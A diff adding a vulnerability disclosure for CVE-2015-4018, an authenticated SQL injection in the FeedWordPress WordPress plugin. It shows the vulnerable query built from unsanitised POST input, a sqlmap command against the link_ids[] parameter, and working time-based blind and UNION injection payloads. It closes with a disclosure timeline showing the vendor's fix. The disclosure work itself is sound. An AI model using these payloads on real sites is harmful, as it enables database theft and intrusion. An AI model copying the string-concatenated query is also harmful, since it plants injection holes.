@@ -1,0 +1,52 @@
+# Exploit Title: SQLi in FeedWordPress WordPress plugin
+# Date: 2015-05-19
+# Exploit Author: Adrián M. F.
+# Vendor Homepage: https://wordpress.org/plugins/feedwordpress/
+# Vulnerable version: 2015.0426
+# Fixed version: 2015.0514
+# CVE : CVE-2015-4018
+
+
+(1) Authenticated SQLi [CWE-89]
+-------------------------------
+
+* CODE:
+feedwordpresssyndicationpage.class.php:89
++++++++++++++++++++++++++++++++++++++++++
+$targets = $wpdb->get_results("
+    SELECT * FROM $wpdb->links
+    WHERE link_id IN (".implode(",",$_POST['link_ids']).")
+");
++++++++++++++++++++++++++++++++++++++++++
+http://192.168.167.131/wordpress/wp-admin/admin.php?page=feedwordpress/syndication.php
+POST DATA: _wpnonce=a909681945&_wp_http_referer=/wordpress/wp-admin/admin.php?page=feedwordpress/syndication.php&action=Update Checked&link_ids[]=1[SQLi]
+
+* POC:
+SQLMap
++++++++++++++++++++++++++++++++++++++++++
+./sqlmap.py -u "http://[domain]/wp-admin/admin.php?page=feedwordpress%2Fsyndication.php&visibility=Y" --data="_wpnonce=a909681945&_wp_http_referer=/wordpress/wp-admin/admin.php?page=feedwordpress/syndication.php&action=Update Checked&link_ids[]=1" -p "link_ids[]" --dbms mysql --cookie="[cookie]"
+[............]
+POST parameter 'link_ids[]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection points with a total of 62 HTTP(s) requests:
+---
+Parameter: link_ids[] (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: _wpnonce=a909681945&_wp_http_referer=/wordpress/wp-admin/admin.php?page=feedwordpress/syndication.php&action=Update Checked&link_ids[]=1) AND (SELECT * FROM (SELECT(SLEEP(5)))eHWc) AND (7794=7794
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 13 columns
+    Payload: _wpnonce=a909681945&_wp_http_referer=/wordpress/wp-admin/admin.php?page=feedwordpress/syndication.php&action=Update Checked&link_ids[]=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a6b6a71,0x70716153577975544373,0x7178716271)-- 
+---
+[10:40:14] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 7.0 (wheezy)
+web application technology: Apache 2.2.22, PHP 5.4.39
+back-end DBMS: MySQL 5.0.12
++++++++++++++++++++++++++++++++++++++++++
+
+Timeline
+========
+2015-05-09: Discovered vulnerability.
+2015-05-14: Vendor notification.
+2015-05-14: Vendor response and fix.
+2015-05-19: Public disclosure.
